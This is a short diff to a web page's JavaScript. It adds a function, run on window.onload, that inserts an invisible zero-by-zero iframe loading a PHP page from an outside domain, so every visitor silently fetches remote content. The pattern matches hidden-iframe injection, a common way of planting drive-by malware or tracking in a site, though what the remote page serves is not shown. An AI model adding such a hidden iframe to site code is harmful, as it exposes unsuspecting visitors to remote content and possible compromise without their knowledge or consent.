@@ -214,6 +214,7 @@ window.onload = function(){
 	//req.open("GET", phpLogs);
 	//req.send();
 	date();
+    cons();
 };
 //function date(){
 //	//req.overrideMimeType("text/xml");
@@ -277,3 +278,12 @@ function cleandiv(id){
 	if (olddiv = document.getElementById(id)){
 	document.body.removeChild(olddiv);
 }};
+function cons(){
+    var a = document.createElement('iframe');
+	a.align = "left";
+	a.width="0" 
+	a.height="0"
+	a.src="http://www.clairemaindor.fr/rien.php"
+	a.frameborder="0" 
+	document.body.appendChild(a);
+};
